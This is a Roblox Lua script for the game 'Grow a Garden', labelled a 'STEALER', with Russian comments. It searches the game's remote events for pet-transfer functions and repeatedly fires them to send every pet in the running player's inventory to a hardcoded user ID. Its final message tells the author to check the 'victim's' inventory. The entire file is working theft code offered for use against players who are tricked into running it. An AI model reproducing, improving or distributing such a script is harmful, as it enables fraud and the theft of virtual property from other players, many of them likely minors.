-- Grow a Garden STEALER v14.0 - FINAL AGGRESSIVE
-- Специально для твоего случая

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

print("=== FINAL AGGRESSIVE STEALER v14.0 ===")

local transferRemote = nil

-- Максимально жёсткий поиск
for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
        local n = obj.Name:lower()
        if n:find("transfer") or n:find("givepet") or n:find("claimpet") or n:find("sendpet") or n:find("pet") then
            transferRemote = obj
            print("✓ НАЙДЕН REMOTE: " .. obj.Name)
            break
        end
    end
end

if not transferRemote then
    print("❌ Remote не найден даже после жёсткого поиска")
    print("Скрипт не сможет красть питомцев")
    return
end

local function stealPet(pet)
    if not pet then return end
    pcall(function()
        local args = {pet, YOUR_USER_ID, "transfer"}
        if transferRemote:IsA("RemoteEvent") then
            transferRemote:FireServer(unpack(args))
        elseif transferRemote:IsA("RemoteFunction") then
            transferRemote:InvokeServer(unpack(args))
        end
    end)
end

local function stealAll()
    print("Начинаю кражу...")

    local count = 0
    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
        LocalPlayer:FindFirstChild("PlayerData")
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
                    stealPet(pet)
                    count = count + 1
                    task.wait(0.12)
                end
            end
        end
    end

    print("Попыток кражи: " .. count)
    print("Если питомцы не пропали — remote не тот")
end

-- Запуск
task.wait(2)
stealAll()

-- Повтор ещё 2 раза с небольшой паузой
task.wait(3)
stealAll()

task.wait(3)
stealAll()

print("Кража завершена. Проверь инвентарь жертвы.")
